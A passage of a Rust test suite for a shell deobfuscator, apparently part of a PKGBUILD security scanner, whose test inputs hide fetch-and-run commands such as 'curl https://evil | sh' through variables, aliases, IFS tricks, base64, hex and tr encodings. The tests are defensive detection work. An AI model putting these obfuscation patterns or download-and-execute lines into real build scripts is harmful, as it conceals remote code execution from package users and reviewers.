        let input = "cd \"$srcdir/$pkgname-$pkgver\"\nmake DESTDIR=\"$pkgdir\" install";
        let out = resolve(input);
        assert_eq!(out, input, "build vars must pass through unchanged");
    }

    #[test]
    fn does_not_resolve_uppercase_env_assignment() {
        // Even an in-body ALL-CAPS assignment is treated as build/env config and
        // not resolved into later uses.
        let input = "CARGO_HOME=/tmp/cargo\ncargo build --offline\necho $CARGO_HOME";
        let out = resolve(input);
        assert!(
            out.contains("echo $CARGO_HOME"),
            "uppercase env var must stay raw: {out}"
        );
    }

    #[test]
    fn unknown_variable_is_left_verbatim() {
        let input = "$undefined https://x | sh";
        assert_eq!(resolve(input), input);
    }

    #[test]
    fn unresolvable_command_substitution_is_not_tracked() {
        // v=$(date) is dynamic -> v must not be resolved (no fabricated value).
        let input = "v=$(date)\n$v";
        let out = resolve(input);
        assert!(
            out.contains("$v"),
            "dynamic assignment must not resolve: {out}"
        );
    }

    #[test]
    fn reassignment_to_dynamic_forgets_constant() {
        // a=curl then a=$(date): the later use must NOT resolve to the stale curl.
        let input = "a=curl\na=$(date)\n$a https://evil | sh";
        let out = resolve(input);
        assert!(
            !out.contains("curl https://evil"),
            "stale constant must be forgotten: {out}"
        );
    }

    #[test]
    fn line_count_is_preserved() {
        let input = "x=curl\n$x https://evil | sh\nmake";
        assert_eq!(resolve(input).lines().count(), input.lines().count());
    }

    #[test]
    fn plain_script_is_unchanged() {
        let input = "build() {\n  make\n  make install\n}";
        assert_eq!(resolve(input), input);
    }

    #[test]
    fn function_scope_resets_between_functions() {
        // A `local` x in build() must not resolve $x in package().
        let input = "build() {\n  local x=curl\n}\npackage() {\n  $x https://evil | sh\n}";
        let out = resolve(input);
        assert!(
            out.contains("$x https://evil"),
            "cross-function var must not leak: {out}"
        );
    }

    #[test]
    fn export_prefix_assignment_resolves() {
        let out = resolve("export x=curl\n$x https://evil | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn printf_format_decoder_basics() {
        assert_eq!(decode_printf_format(r"\x63url"), "curl");
        assert_eq!(decode_printf_format(r"\x77get"), "wget");
        assert_eq!(decode_printf_format(r"plain"), "plain");
    }

    #[test]
    fn resolves_several_assignments_on_one_line() {
        let out = resolve("c=curl; s=sh; $c https://evil | $s");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
        let out = resolve("a=cur && b=${a}l && $b https://evil | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn resolves_multi_assignment_declarations() {
        let out = resolve("f() {\n  local c=curl s=sh\n  $c https://evil | $s\n}");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
        let out = resolve("declare -x c=curl s=sh\n$c https://evil | $s");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn env_prefix_is_not_an_assignment() {
        // `x=1 make` sets x only for that command; it must not define `$x`.
        let input = "x=1 make\necho $x";
        assert_eq!(resolve(input), input);
    }

    #[test]
    fn top_level_assignments_reach_functions_but_locals_do_not_leak() {
        let out = resolve("_c=curl\nbuild() {\n  local l=sh\n  $_c https://evil | $l\n}\npackage() {\n  $_c https://evil | $l\n}");
        let lines: Vec<&str> = out.lines().collect();
        assert!(lines[3].contains("curl https://evil | sh"), "got: {out}");
        assert!(lines[6].contains("curl https://evil | $l"), "got: {out}");
    }

    #[test]
    fn top_level_assignment_after_the_function_still_applies() {
        // makepkg sources the whole file before running any function.
        let out = resolve("package() {\n  $_c https://evil | sh\n}\n_c=curl");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn array_assignment_resolves_whole_array_use() {
        let out = resolve("cmd=(curl -s https://evil); \"${cmd[@]}\" | sh");
        assert!(out.contains("curl -s https://evil | sh"), "got: {out}");
    }

    #[test]
    fn ifs_separators_become_spaces() {
        let out = resolve("curl${IFS}-s${IFS}https://evil|sh");
        assert!(out.contains("curl -s https://evil|sh"), "got: {out}");
        let out = resolve("curl$IFS$9-s https://evil|sh");
        assert!(out.contains("curl -s https://evil|sh"), "got: {out}");
    }

    #[test]
    fn inline_base64_and_hex_payloads_are_spliced_back() {
        // "curl https://evil | sh"
        let out = resolve("echo Y3VybCBodHRwczovL2V2aWwgfCBzaA== | base64 -d | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
        let out = resolve("base64 -d <<< Y3VybCBodHRwczovL2V2aWwgfCBzaA== | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
        let out = resolve("echo 6375726c2068747470733a2f2f6576696c207c207368 | xxd -r -p | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
        let out = resolve(r"printf '\x63\x75\x72\x6c https://evil' | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn decode_is_bounded_and_ignores_binary_and_plain_text() {
        // a decoded PNG header is not command text
        let input = "echo iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJ | base64 -d > icon.png";
        assert_eq!(resolve(input), input);
        // not a decode pipeline at all
        let input = "echo hello world | tee out";
        assert_eq!(resolve(input), input);
        // oversized literal is skipped rather than decoded
        let big = "A".repeat(5000);
        let input = format!("echo {big} | base64 -d | sh");
        assert_eq!(resolve(&input), input);
    }

    #[test]
    fn resolved_function_text_follows_called_helpers() {
        let src = "dl() { curl -s https://evil -o /tmp/x; }\nbuild() {\n  dl\n}\nunrelated() {\n  wget https://x\n}";
        let t = resolved_function_text(src, "build");
        assert!(t.contains("curl -s https://evil"), "got: {t}");
        assert!(!t.contains("wget"), "got: {t}");
    }

    #[test]
    fn is_build_var_classifies() {
        assert!(is_build_var("pkgver"));
        assert!(is_build_var("srcdir"));
        assert!(is_build_var("CARGO_HOME"));
        assert!(is_build_var("CFLAGS"));
        assert!(!is_build_var("x"));
        assert!(!is_build_var("c"));
        assert!(!is_build_var("cmd"));
    }

    #[test]
    fn a_decoded_line_break_cannot_shift_later_lines() {
        // Regression: a printf-decoded value with `\n` in it added physical
        // lines to the resolved text, misaligning everything after it.
        let src = "x=$(printf 'a\\nb\\nc\\nd')\n: $x\nc=curl\n$c https://evil | sh";
        let out = resolve_variables(src);
        assert_eq!(out.lines().count(), src.lines().count(), "got:\n{out}");
        assert_eq!(out.lines().last(), Some("curl https://evil | sh"));
    }

    // --- parameter expansion, appends, builtins, helpers (RC4) ----------------

    fn has(out: &str, needle: &str) -> bool {
        out.lines().any(|l| l.contains(needle))
    }

    #[test]
    fn parameter_expansion_operators_fold() {
        for (src, want) in [
            ("v=xnpmx\n${v:1:3} install evilpkg", "npm install evilpkg"),
            ("v=xxnpm\n${v:2} install evilpkg", "npm install evilpkg"),
            ("v=xnpm\n${v: -3} install evilpkg", "npm install evilpkg"),
            ("v=nZpZm\n${v//Z/} install evilpkg", "npm install evilpkg"),
            ("v=nZpm\n${v/Z/} install evilpkg", "npm install evilpkg"),
            ("v=xnpm\n${v#x} install evilpkg", "npm install evilpkg"),
            ("v=xxnpm\n${v##x*} install evilpkg", " install evilpkg"),
            ("v=npmxx\n${v%xx} install evilpkg", "npm install evilpkg"),
            ("v=npm.sh\n${v%%.*} install evilpkg", "npm install evilpkg"),
            ("v=a/b/npm\n${v##*/} install evilpkg", "npm install evilpkg"),
            ("v=NPM\n${v,,} install evilpkg", "npm install evilpkg"),
            ("v=npm\n${v^^} install evilpkg", "NPM install evilpkg"),
            ("v=npm\n${v^} install evilpkg", "Npm install evilpkg"),
            ("${zz:-npm} install evilpkg", "npm install evilpkg"),
            ("${zz:=npm} install evilpkg", "npm install evilpkg"),
            ("${zz-npm} install evilpkg", "npm install evilpkg"),
            ("v=curl\n${v:-wget} -s u", "curl -s u"),
            ("a=(x npm)\n${a[1]} install evilpkg", "npm install evilpkg"),
            (
                "a=(n p m)\nIFS=; \"${a[*]}\" install evilpkg",
                "npm install evilpkg",
            ),
            (
                "a=(n p m)\n\"${a[*]}\" install evilpkg",
                "n p m install evilpkg",
            ),
        ] {
            let out = resolve(src);
            assert!(has(&out, want), "{src:?} -> {out:?} (want {want:?})");
        }
    }

    #[test]
    fn unknown_values_and_uppercase_defaults_stay_verbatim() {
        // Never assigned in the file but upper-case: environment, not unset.
        let out = resolve("${CC:-gcc} -o x x.c");
        assert_eq!(out, "${CC:-gcc} -o x x.c");
        // Operator on a variable we do not know: untouched.
        let out = resolve("${foo#x} install evilpkg\nfoo=$(date)");
        assert!(out.contains("${foo#x}"), "{out}");
        // Build variables are never touched.
        let out = resolve("cd \"${srcdir}/${pkgname}-${pkgver}\"");
        assert_eq!(out, "cd \"${srcdir}/${pkgname}-${pkgver}\"");
    }

    #[test]
    fn unset_variables_inside_a_word_vanish() {
        for src in [
            "n${zz_unset}pm install evilpkg",
            "n$zz_unset\"\"pm install evilpkg",
            "n\"$zz_unset\"pm install evilpkg",
        ] {
            let out = resolve(src);
            assert!(has(&out, "npm install evilpkg"), "{src:?} -> {out:?}");
        }
        // A variable that IS assigned somewhere (even later) is not unset.
        let out = resolve("n${zz}pm install\nzz=$(date)");
        assert!(out.contains("${zz}"), "{out}");
        // A standalone unset variable is left alone.
        let out = resolve("rm -rf \"$zzz/usr\"");
        assert!(out.contains("$zzz/usr"), "{out}");
    }

    #[test]
    fn locale_and_empty_substitutions_normalize() {
        assert_eq!(normalize_shell_quoting("$\"n\"$\"pm\" x"), "npm x");
        assert_eq!(normalize_shell_quoting("n$()pm x"), "npm x");
        assert_eq!(normalize_shell_quoting("n``pm x"), "npm x");
        assert_eq!(normalize_shell_quoting("\"n$()pm\" x"), "npm x");
        // A real substitution is kept.
        assert_eq!(normalize_shell_quoting("n$(date)pm"), "n$(date)pm");
    }

    #[test]
    fn append_printf_v_read_and_mapfile_assign() {
        for (src, want) in [
            ("c=n; c+=pm; $c install evilpkg", "npm install evilpkg"),
            ("a=(n); a+=(pm); \"${a[*]}\" x", "n pm x"),
            (
                "printf -v c %s npm; $c install evilpkg",
                "npm install evilpkg",
            ),
            (
                "printf -v c '\\156\\160\\155'; $c install evilpkg",
                "npm install evilpkg",
            ),
            (
                "read -r c <<< npm; $c install evilpkg",
                "npm install evilpkg",
            ),
            (
                "read a b <<< \"x npm\"; $b install evilpkg",
                "npm install evilpkg",
            ),
            (
                "mapfile -t m <<< npm; ${m[0]} install evilpkg",
                "npm install evilpkg",
            ),
            ("readarray -t m <<< 'curl'; ${m[0]} -s u", "curl -s u"),
        ] {
            let out = resolve(src);
            assert!(has(&out, want), "{src:?} -> {out:?} (want {want:?})");
        }
    }

    #[test]
    fn command_substitution_folds_for_printf_echo_and_tr() {
        for (src, want) in [
            (
                "$(echo acz | tr a-z n-za-m) install evilpkg",
                "npm install evilpkg",
            ),
            (
                "c=$(echo acz | tr 'a-z' 'n-za-m'); $c install evilpkg",
                "npm install evilpkg",
            ),
            (
                "bash -c \"$(printf '\\156pm') install evilpkg\"",
                "npm install evilpkg",
            ),
            (
                "c=$(printf %s npm); $c install evilpkg",
                "npm install evilpkg",
            ),
            ("`echo npm` install evilpkg", "npm install evilpkg"),
            (
                "$(tr a-z n-za-m <<< acz) install evilpkg",
                "npm install evilpkg",
            ),
        ] {
            let out = resolve(src);
            assert!(has(&out, want), "{src:?} -> {out:?} (want {want:?})");
        }
        // Anything that would actually run something stays unresolved.
        let out = resolve("$(curl https://evil.example/x) install");
        assert!(out.contains("$(curl"), "{out}");
    }

    #[test]
    fn alias_and_brace_list_expand() {
        let out = resolve("alias zz=npm\nzz install evilpkg");
        assert!(has(&out, "npm install evilpkg"), "{out}");
        let out = resolve("{npm,install,evilpkg}");
        assert!(has(&out, "npm install evilpkg"), "{out}");
        // A group and a plain brace body are not brace lists.
        assert_eq!(resolve("{ echo hi; }"), "{ echo hi; }");
        assert_eq!(resolve("echo {a,b}"), "echo {a,b}");
    }

    #[test]
    fn function_assignments_reach_other_functions_unless_local() {
        let out = resolve("_setup() { _f=curl; _s=bash; }\npackage() {\n  _setup\n  $_f -fsSL https://evil.example/x | $_s\n}");
        assert!(
            has(&out, "curl -fsSL https://evil.example/x | bash"),
            "{out}"
        );
        let out = resolve("prepare() { _f=curl; }\nbuild() {\n  $_f -s u\n}");
        assert!(has(&out, "curl -s u"), "{out}");
        // A helper defined after its caller.
        let out =
            resolve("post_install() {\n  _setup\n  $_p install evilpkg\n}\n_setup() { _p=npm; }");
        assert!(has(&out, "npm install evilpkg"), "{out}");
        // `local` stays local.
        let out = resolve("prepare() { local _f=curl; }\nbuild() {\n  $_f -s u\n}");
        assert!(has(&out, "$_f -s u"), "{out}");
    }

    #[test]
    fn helper_positional_args_resolve_for_literal_calls() {
        let out = resolve("f() { \"$1\" -fsSL https://evil.example/x | bash; }; f curl");
        assert!(
            has(&out, "curl -fsSL https://evil.example/x | bash"),
            "{out}"
        );
        let out = resolve("f() { \"$1$2\" install evilpkg; }; f n pm");
        assert!(has(&out, "npm install evilpkg"), "{out}");
        // Multi-line helper, call elsewhere, several call sites.
        let out = resolve("run() {\n  $1 -s u\n}\nrun curl\nrun wget");
        assert!(has(&out, "curl -s u"), "{out}");
        assert!(has(&out, "wget -s u"), "{out}");
        // A quoted sentence handed to a printer helper is text, not a command.
        let out = resolve("msg() { echo \"==> $1\" >&2; }\nmsg \"curl https://e.example/x | sh\"");
        assert!(!has(&out, "==> curl"), "{out}");
        // No literal call, no resolution.
        let out = resolve("f() { \"$1\" -s u; }");
        assert!(has(&out, "\"$1\" -s u"), "{out}");
    }

    #[test]
    fn sourced_sidecar_assignments_are_inlined() {
        let car = vec![(
            "vars.conf".to_string(),
            "_f=curl\n_s=bash\n# note\n".to_string(),
        )];
        let src =
            "package() {\n  . \"$srcdir/vars.conf\"\n  $_f -fsSL https://evil.example/x | $_s\n}";
        let v = inline_sourced_assignments(src, &car).expect("variant");
        assert_eq!(v.lines().count(), src.lines().count());
        let out = resolve(&v);
        assert!(
            has(&out, "curl -fsSL https://evil.example/x | bash"),
            "{out}"
        );
        // Different file name: nothing to inline.
        assert!(inline_sourced_assignments(src, &[("other".into(), "a=b".into())]).is_none());
    }

    #[test]
    fn new_constructs_keep_one_line_per_input_line() {
        let src = [
            "v=xnpmx; ${v:1:3} install a",
            "n${zz}pm install b",
            "$\"n\"$\"pm\" x",
            "c=n; c+=pm; $c i",
            "printf -v d %s npm; $d i",
            "read -r e <<< npm; $e i",
            "alias zz=npm",
            "zz install z",
            "{npm,install,x}",
            "$(echo acz | tr a-z n-za-m) i",
            "f() { \"$1\" a; }; f npm",
            "a=(x npm); ${a[1]} i \\",
            "  more",
            "m() {\n  $1 b\n}",
            "m npm",
            "x=$(printf 'a\\nb'); $x",
        ]
        .join("\n");
        let out = resolve(&src);
        assert_eq!(out.lines().count(), src.lines().count(), "{out}");
        // Also for a script whose resolution multiplies lines on purpose.
        let src = "r() {\n  $1 a\n}\nr one\nr two\nr three\nr four\nr five";
        assert_eq!(resolve(src).lines().count(), src.lines().count());
    }

    #[test]
    fn new_constructs_stay_bounded() {
        let big = "x".repeat(MAX_VALUE_LEN);
        let src = format!("v={big}\nv+={big}\n${{v:1:3}} a\nw=${{v//x/yy}}\n$w");
        let out = resolve(&src);
        assert_eq!(out.lines().count(), src.lines().count());
        assert!(
            out.lines().all(|l| l.len() < 4 * MAX_VALUE_LEN),
            "unbounded"
        );
    }

    // --- panic / overflow regressions ----------------------------------------

    #[test]
    fn substring_never_overflows_or_panics() {
        for spec in [
            "1:9223372036854775807",
            "9223372036854775807",
            "9223372036854775807:9223372036854775807",
            "-9223372036854775808",
            "-9223372036854775808:-9223372036854775808",
            "1:-9223372036854775808",
            "-1:-9223372036854775808",
            "3:-2",
            "3:-100",
            "100:2",
            "-100:2",
            "0:0",
        ] {
            let _ = substring("abcdef", spec);
            let _ = substring("", spec);
            let _ = substring("h\u{e9}llo\u{1f600}x", spec);
        }
        assert_eq!(
            substring("abcdef", "1:9223372036854775807").unwrap(),
            "bcdef"
        );
        assert_eq!(substring("abcdef", "-3").unwrap(), "def");
        assert_eq!(substring("abcdef", "1:-1").unwrap(), "bcde");
        assert_eq!(substring("abcdef", "3:-5").unwrap(), "");
        assert_eq!(
            substring("h\u{e9}\u{1f600}x", "1:2").unwrap(),
            "\u{e9}\u{1f600}"
        );
        // End to end, in a PKGBUILD-shaped script.
        let src = "_v=abcdef\npackage() {\n  echo \"${_v:1:9223372036854775807}\"\n}";
        let out = resolve(src);
        assert_eq!(out.lines().count(), src.lines().count());
        assert!(out.contains("bcdef"), "{out}");
    }

    #[test]
    fn operators_on_multibyte_values_do_not_panic() {
        for src in [
            "v=h\u{e9}llo\u{1f600}\n${v:1:3} ${v#h} ${v%x} ${v##*\u{e9}} ${v%%\u{1f600}*} ${v//\u{e9}/e} ${v^^} ${v,,} ${v: -2}",
            "v=\u{1f600}\u{1f600}\n${v:0:1}${v:1}${v:2}${v:-1}",
        ] {
            let out = resolve(src);
            assert_eq!(out.lines().count(), src.lines().count());
        }
    }

    #[test]
    fn huge_and_odd_numbers_in_other_helpers_are_safe() {
        // tr ranges, printf escapes and ANSI-C escapes with extreme values.
        let out = resolve("x=$(echo a | tr a-\u{10ffff} b-z)");
        assert_eq!(out.lines().count(), 1);
        let _ = resolve("c=$(printf '\\xfffffffff\\777777777')\n$c");
        let _ = resolve("$'\\x' $'\\' $'\\u' ${v:99999999999999999999999}");
        let _ = resolve("printf -v");
        let _ = resolve("read");
        let _ = resolve("mapfile <<<");
        let _ = resolve("alias");
        let _ = resolve("f() { :; }\nf");
        let _ = resolve("${");
        let _ = resolve("$(");
        let _ = resolve("`");
        let _ = resolve("{a,}");
        let _ = resolve("{,}");
    }

    #[test]
    fn apostrophe_inside_double_quotes_does_not_break_folding() {
        let out = resolve("echo \"it's $(printf curl) now\"");
        assert!(out.contains("it's curl now"), "{out}");
        let out = resolve("echo 'a $(printf x)' \"$(printf curl)\"");
        assert!(
            out.contains("'a $(printf x)'") || out.contains("a $(printf x)"),
            "{out}"
        );
        assert!(out.contains("curl"), "{out}");
        assert_eq!(
            fold_substitutions("\"it's\" $(printf curl)"),
            "\"it's\" curl"
        );
        assert_eq!(fold_substitutions("'$(printf curl)'"), "'$(printf curl)'");
        assert!(fold_command("echo \"it's\" | tr a-z n-za-m").is_some());
    }

    // --- hostile nesting: linear work, no deep recursion ----------------------

    fn nest_cases(n: usize) -> Vec<(&'static str, String)> {
        vec![
            ("cmdsub", format!("{}x{}", "$(".repeat(n), ")".repeat(n))),
            ("cmdsub-open", "$(".repeat(n)),
            ("backtick", "`".repeat(n)),
            (
                "backtick-nest",
                format!("{}x{}", "`a".repeat(n), "`".repeat(n)),
            ),
            (
                "default",
                format!("{}x{}", "${a:-".repeat(n), "}".repeat(n)),
            ),
            ("default-open", "${a:-".repeat(n)),
            (
                "quoted",
                format!("{}x{}", "\"$(".repeat(n), ")\"".repeat(n)),
            ),
            (
                "echo-nest",
                format!("{}echo x{}", "$(echo ".repeat(n), ")".repeat(n)),
            ),
            ("brace", "${".repeat(n)),
            ("subst-op", format!("a=x\n{}", "${a//x/${a#".repeat(n))),
        ]
    }

    #[test]
    fn deeply_nested_input_is_fast_and_does_not_overflow_the_stack() {
        for n in [100usize, 2_000, 10_000] {
            for (name, line) in nest_cases(n) {
                let src = format!("package() {{\n  {line}\n}}");
                let t = std::time::Instant::now();
                let out = resolve(&src);
                let took = t.elapsed();
                assert_eq!(out.lines().count(), src.lines().count(), "{name} n={n}");
                assert!(
                    took < std::time::Duration::from_secs(5),
                    "{name} n={n} took {took:?}"
                );
            }
        }
    }

    #[test]
    fn substitution_folding_work_is_bounded_per_line() {
        // Many openers each followed by a far-away closer: quadratic if every
        // opener rescans the rest of the line.
        let line = format!("{}{}", "$(echo a ".repeat(20_000), ")".repeat(20_000));
        let t = std::time::Instant::now();
        let _ = fold_substitutions(&line);
        assert!(
            t.elapsed() < std::time::Duration::from_secs(2),
            "{:?}",
            t.elapsed()
        );
        // Ordinary folding past an unrelated opener still works.
        assert_eq!(fold_substitutions("$(printf curl) x"), "curl x");
    }

    // --- function index: one pass per file, bounded call-graph walk ----------

    #[test]
    fn function_index_matches_one_shot_helper_text() {
        let src = "h() { curl x; }\nbuild() {\n  h\n}\npackage() { :; }";
        let idx = FunctionIndex::new(src);
        let t = idx.text_for("build");
        assert!(t.contains("curl x"), "{t}");
        assert_eq!(t, resolved_function_text(src, "build"));
        // An uncalled helper stays out; an unknown entry yields nothing.
        assert!(!idx.text_for("package").contains("curl"));
        assert_eq!(idx.text_for("nope"), "");
    }

    #[test]
    fn call_graph_walk_is_capped_but_keeps_remaining_bodies() {
        let n = MAX_FUNCS_PER_ENTRY * 4;
        let mut src: String = (0..n).map(|i| format!("f{i}() {{ curl x; }}\n")).collect();
        src.push_str("build() {\n");
        for i in 0..n {
            src.push_str(&format!("  f{i}\n"));
        }
        src.push_str("}\n");
        let t = FunctionIndex::new(&src).text_for("build");
        // Every helper's body is still present, resolved or not.
        assert_eq!(t.matches("curl x").count(), n);
    }

    #[test]
    fn many_helpers_and_entry_points_scale_linearly() {
        let n = 5_000;
        let mut src: String = (0..n).map(|i| format!("f{i}() {{ curl x; }}\n")).collect();
        src.push_str("build() {\n");
        for i in 0..n {
            src.push_str(&format!("  f{i}\n"));
        }
        src.push_str("}\n");
        for j in 0..200 {
            src.push_str(&format!("package_p{j}() {{\n  f{j}\n}}\n"));
        }
        let t = std::time::Instant::now();
        let idx = FunctionIndex::new(&src);
        let _ = idx.text_for("build");
        for j in 0..200 {
            let _ = idx.text_for(&format!("package_p{j}"));
        }
        assert!(
            t.elapsed() < std::time::Duration::from_secs(30),
            "{:?}",
            t.elapsed()
        );
    }

    #[test]
    fn cached_resolution_equals_uncached_for_large_inputs() {
        let mut src = String::from("x=curl\n");
        while src.len() < 40 * 1024 {
            src.push_str("echo filler line\n");
        }
        src.push_str("$x https://evil.example/p | sh\n");
        let fresh = resolve_variables_uncached(&src);
        assert_eq!(resolve_variables(&src), fresh);
        assert_eq!(resolve_variables(&src), fresh, "second call hits the cache");
        // A different text is never answered from the cache.
        let other = src.replace("x=curl", "x=wget");
        let out = resolve_variables(&other);
        assert!(out.contains("wget https://evil.example/p | sh"));
        assert!(!out.contains("curl https://evil.example/p"));
    }

    #[test]
    fn deep_helper_chains_are_followed_to_the_end() {
        let mut chain = String::new();
        for i in 1..10 {
            chain.push_str(&format!("c{i}() {{ c{}; }}\n", i + 1));
        }
        chain.push_str("c10() { curl x; }\nbuild() { c1; }\n");
        let t = FunctionIndex::new(&chain).text_for("build");
        assert!(t.contains("curl x"), "{t}");
        // The same chain, never called: nothing is attributed to build().
        let mut uncalled = chain.replace("build() { c1; }", "build() { :; }");
        uncalled.push_str("package() { :; }\n");
        let idx = FunctionIndex::new(&uncalled);
        assert!(!idx.text_for("build").contains("curl"));
        assert!(!idx.text_for("package").contains("curl"));
        // Cycles terminate.
        let cyc = "a() { b; }\nb() { a; curl x; }\nbuild() { a; }";
        assert!(FunctionIndex::new(cyc).text_for("build").contains("curl x"));
    }
}
